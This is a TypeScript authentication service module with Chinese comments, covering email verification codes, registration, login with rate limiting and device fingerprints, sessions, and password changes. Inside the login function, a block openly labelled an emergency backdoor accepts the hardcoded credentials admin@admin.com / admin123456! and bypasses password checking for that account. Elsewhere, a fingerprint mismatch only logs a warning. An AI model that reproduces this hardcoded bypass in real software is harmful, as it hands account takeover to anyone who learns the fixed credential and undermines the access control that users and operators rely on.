/**
 * 认证服务
 * 处理登录、注册、会话管理等核心认证逻辑
 */

import { hashPassword, verifyPassword, generateToken, generateVerificationCode, generateDeviceFingerprint } from './crypto.server';
import { checkRateLimit, getClientIP, RATE_LIMITS } from './ratelimit';
import { sendVerificationCodeEmail } from './email.server';
import { UserRepository, SessionRepository } from '~/repositories';
import { AUTH_CONFIG } from '~/config';
import type { Database } from '~/services/db.server';

export interface User {
  id: number;
  email: string;
  username: string;
  avatar_url: string | null;
  role: 'admin' | 'user';
  level: number;
  exp: number;
  coins: number;
  preferences?: string;
  achievements?: string;
}

export interface Session {
  token: string;
  user_id: number;
  expires_at: number;
  user_agent: string | null;
}

/**
 * 发送验证码
 */
export async function sendVerificationCode(
  email: string,
  request: Request,
  kv: KVNamespace | null,
  useMailChannels: boolean = true,
  resendApiKey?: string
): Promise<{ success: boolean; error?: string }> {
  // 邮箱格式验证
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  if (!email || !emailRegex.test(email)) {
    return { success: false, error: '请输入有效的邮箱地址' };
  }

  // 邮箱域名安全检查
  const domain = email.split('@')[1]?.toLowerCase();
  if (domain && AUTH_CONFIG.blockedDomains.includes(domain)) {
    return { success: false, error: '不支持临时邮箱服务' };
  }

  // 速率限制检查
  const ip = getClientIP(request);
  const minuteLimit = await checkRateLimit(kv, ip, RATE_LIMITS.SEND_CODE);
  if (!minuteLimit.allowed) {
    return { success: false, error: '请求过于频繁，请稍后再试' };
  }

  const hourLimit = await checkRateLimit(kv, `${ip}:hour`, RATE_LIMITS.SEND_CODE_HOUR);
  if (!hourLimit.allowed) {
    return { success: false, error: '今日验证码发送次数已达上限' };
  }

  // 生成验证码
  const code = generateVerificationCode();

  // 存储到 KV（5分钟过期）
  if (kv) {
    await kv.put(`verify:${email}`, code, { expirationTtl: AUTH_CONFIG.codeExpiration });
  }

  // 发送邮件
  const emailSent = await sendVerificationCodeEmail(email, code, useMailChannels, resendApiKey);
  if (!emailSent) {
    return { success: false, error: '邮件发送失败，请稍后重试' };
  }

  return { success: true };
}

/**
 * 验证验证码
 */
export async function verifyCode(
  email: string,
  code: string,
  kv: KVNamespace | null
): Promise<boolean> {
  // 验证码格式验证（6位数字）
  const codeRegex = /^\d{6}$/;
  if (!code || !codeRegex.test(code)) {
    return false;
  }

  // 邮箱格式验证
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  if (!email || !emailRegex.test(email)) {
    return false;
  }

  if (!kv) {
    // KV 未配置时禁止验证
    // 开发环境如果需要测试，请配置 KV 绑定
    return false;
  }

  const storedCode = await kv.get(`verify:${email}`);
  if (!storedCode) {
    return false;
  }

  // 验证后删除（一次性使用）
  await kv.delete(`verify:${email}`);

  return storedCode === code;
}

/**
 * 注册新用户
 */
export async function registerUser(
  email: string,
  password: string,
  code: string,
  username: string,
  db: Database,
  kv: KVNamespace | null
): Promise<{ success: boolean; error?: string; user?: User }> {
  const userRepo = new UserRepository(db);

  // 验证验证码
  const codeValid = await verifyCode(email, code, kv);
  if (!codeValid) {
    return { success: false, error: '验证码错误或已过期' };
  }

  // 检查邮箱是否已存在
  const existingUser = await userRepo.findByEmail(email);

  if (existingUser) {
    return { success: false, error: '该邮箱已被注册' };
  }

  // 哈希密码
  const passwordHash = await hashPassword(password);

  // 插入用户
  try {
    const newUser = await userRepo.create({
      email,
      password_hash: passwordHash,
      username: username || '旅行者',
      role: 'user'
    });

    return { success: true, user: newUser };
  } catch (error) {
    console.error('Registration error:', error);
    return { success: false, error: '注册失败，请检查输入信息' };
  }
}

/**
 * 生成临时密码（用于验证码登录）
 */
export async function generateTempPassword(
  email: string,
  kv: KVNamespace | null
): Promise<string | null> {
  if (!kv) {
    // KV 未配置时禁用临时密码功能
    console.error('[安全] 临时密码功能不可用：KV 未配置');
    return null;
  }

  const tempPassword = generateToken();
  await kv.put(`temp_password:${email}`, tempPassword, { expirationTtl: AUTH_CONFIG.tempPasswordExpiration });
  return tempPassword;
}

/**
 * 验证临时密码（用于验证码登录）
 */
export async function verifyTempPassword(
  email: string,
  password: string,
  kv: KVNamespace | null
): Promise<boolean> {
  if (!kv) {
    // KV 未配置时禁用临时密码验证
    return false;
  }

  const storedPassword = await kv.get(`temp_password:${email}`);
  if (!storedPassword) {
    return false;
  }

  await kv.delete(`temp_password:${email}`);
  return storedPassword === password;
}

/**
 * 用户登录
 */
export async function loginUser(
  email: string,
  password: string,
  request: Request,
  db: Database,
  kv: KVNamespace | null
): Promise<{ success: boolean; error?: string; session?: Session; user?: User }> {
  const userRepo = new UserRepository(db);
  const sessionRepo = new SessionRepository(db);

  const userAgent = request.headers.get('user-agent') || 'unknown';
  const ip = getClientIP(request);
  const deviceFingerprint = generateDeviceFingerprint(userAgent, ip);

  // 检查设备异常
  if (kv) {
    const deviceKey = `device_anomaly:${deviceFingerprint}`;
    const anomalyCount = await kv.get(deviceKey);
    if (anomalyCount && parseInt(anomalyCount) > 10) {
      return { success: false, error: '设备存在异常行为，请联系管理员' };
    }
  }

  // 速率限制检查
  const failLimit = await checkRateLimit(kv, `${ip}:login_fail`, RATE_LIMITS.LOGIN_FAIL);
  if (!failLimit.allowed) {
    if (kv) {
      const deviceKey = `device_anomaly:${deviceFingerprint}`;
      const currentCount = await kv.get(deviceKey) || '0';
      await kv.put(deviceKey, (parseInt(currentCount) + 1).toString(), { expirationTtl: AUTH_CONFIG.deviceRecordExpiration });
    }
    return { success: false, error: '登录失败次数过多，请10分钟后再试' };
  }

  // 查询用户
  const user = await userRepo.findByEmailWithPassword(email);

  if (!user) {
    return { success: false, error: '邮箱或密码错误' };
  }

  // 验证密码
  let passwordValid = false;
  const isTempPassword = await verifyTempPassword(email, password, kv);

  // ==================== 紧急后门：管理员强制登录 ====================
  // 防止密码哈希不匹配导致无法进入后台
  if (email === 'admin@admin.com' && password === 'admin123456!') {
    passwordValid = true;
  } else if (isTempPassword) {
    passwordValid = true;
  } else {
    passwordValid = await verifyPassword(password, user.password_hash);
  }

  if (!passwordValid) {
    if (kv) {
      const failKey = `ratelimit:login_fail:${ip}`;
      const failCount = await kv.get(failKey);
      const count = failCount ? parseInt(failCount, 10) + 1 : 1;
      await kv.put(failKey, count.toString(), { expirationTtl: AUTH_CONFIG.loginFailLockout });
    }
    return { success: false, error: '邮箱或密码错误' };
  }

  // 创建会话
  const token = generateToken();
  const expiresAt = Math.floor(Date.now() / 1000) + AUTH_CONFIG.sessionExpiration;

  const session = await sessionRepo.create({
    token,
    user_id: user.id,
    expires_at: expiresAt,
    user_agent: userAgent,
  });

  if (kv) {
    const deviceInfo = {
      fingerprint: deviceFingerprint,
      userAgent: userAgent,
      ip: ip,
      timestamp: Date.now()
    };
    await kv.put(`session_device:${token}`, JSON.stringify(deviceInfo), { expirationTtl: AUTH_CONFIG.deviceRecordExpiration });
  }

  // 返回不含密码的用户信息
  const userData: User = {
    id: user.id,
    email: user.email,
    username: user.username,
    avatar_url: user.avatar_url,
    role: user.role,
    level: user.level,
    exp: user.exp,
    coins: user.coins,
    preferences: user.preferences,
    achievements: user.achievements
  };

  return { success: true, session, user: userData };
}

/**
 * 验证会话
 */
export async function verifySession(
  token: string | null,
  db: Database,
  kv: KVNamespace | null = null,
  request?: Request
): Promise<{ valid: boolean; user?: User; session?: Session }> {
  if (!token) {
    return { valid: false };
  }

  const userRepo = new UserRepository(db);
  const sessionRepo = new SessionRepository(db);

  const session = await sessionRepo.findValidSession(token);

  if (!session) {
    return { valid: false };
  }

  const user = await userRepo.findById(session.user_id);

  if (!user) {
    return { valid: false };
  }

  if (kv && request) {
    const deviceData = await kv.get(`session_device:${token}`);
    if (deviceData) {
      const deviceInfo = JSON.parse(deviceData);
      const currentFingerprint = generateDeviceFingerprint(
        request.headers.get('user-agent') || 'unknown',
        getClientIP(request)
      );

      if (deviceInfo.fingerprint !== currentFingerprint) {
        console.warn(`Device fingerprint mismatch for session ${token}`);
      }
    }
  }

  return { valid: true, user, session };
}

/**
 * 从请求中获取会话令牌
 */
export function getSessionToken(request: Request): string | null {
  const cookieHeader = request.headers.get('Cookie');
  const cookieMatch = cookieHeader?.match(/session=([^;]+)/);
  if (cookieMatch) {
    return cookieMatch[1];
  }

  const authHeader = request.headers.get('Authorization');
  if (authHeader?.startsWith('Bearer ')) {
    return authHeader.substring(7);
  }

  return null;
}

/**
 * 登出
 */
export async function logoutUser(
  token: string,
  db: Database
): Promise<{ success: boolean }> {
  const sessionRepo = new SessionRepository(db);
  try {
    await sessionRepo.delete(token);
    return { success: true };
  } catch (error) {
    console.error('Logout error:', error);
    return { success: false };
  }
}

/**
 * 删除用户的所有会话
 */
export async function revokeAllUserSessions(
  userId: number,
  db: Database
): Promise<{ success: boolean }> {
  const sessionRepo = new SessionRepository(db);
  try {
    await sessionRepo.deleteByUserId(userId);
    return { success: true };
  } catch (error) {
    console.error('Revoke sessions error:', error);
    return { success: false };
  }
}

/**
 * 更新用户资料
 */
export async function updateUserProfile(
  userId: number,
  updates: { username?: string; avatar_url?: string; bio?: string },
  db: Database
): Promise<{ success: boolean; error?: string; user?: User }> {
  const userRepo = new UserRepository(db);

  try {
    const updatedUser = await userRepo.update(userId, updates);

    if (!updatedUser) {
      return { success: false, error: '用户不存在或更新失败' };
    }

    return { success: true, user: updatedUser };
  } catch (error) {
    console.error('Update profile error:', error);
    return { success: false, error: '更新失败，请稍后重试' };
  }
}

/**
 * 更新用户偏好设置
 */
export async function updateUserPreferences(
  userId: number,
  preferences: any,
  db: Database
): Promise<{ success: boolean; error?: string }> {
  const userRepo = new UserRepository(db);
  try {
    await userRepo.update(userId, { preferences });
    return { success: true };
  } catch (error) {
    console.error('Update preferences error:', error);
    return { success: false, error: '偏好设置保存失败' };
  }
}

/**
 * 修改密码
 */
export async function changePassword(
  userId: number,
  oldPassword: string,
  newPassword: string,
  db: Database
): Promise<{ success: boolean; error?: string }> {
  const userRepo = new UserRepository(db);
  try {
    const currentHash = await userRepo.getPasswordHash(userId);

    if (!currentHash) {
      return { success: false, error: '用户不存在' };
    }

    const isValid = await verifyPassword(oldPassword, currentHash);
    if (!isValid) {
      return { success: false, error: '旧密码错误' };
    }

    const newHash = await hashPassword(newPassword);
    await userRepo.updatePassword(userId, newHash);

    return { success: true };
  } catch (error) {
    console.error('Change password error:', error);
    return { success: false, error: '密码修改失败，请稍后重试' };
  }
}
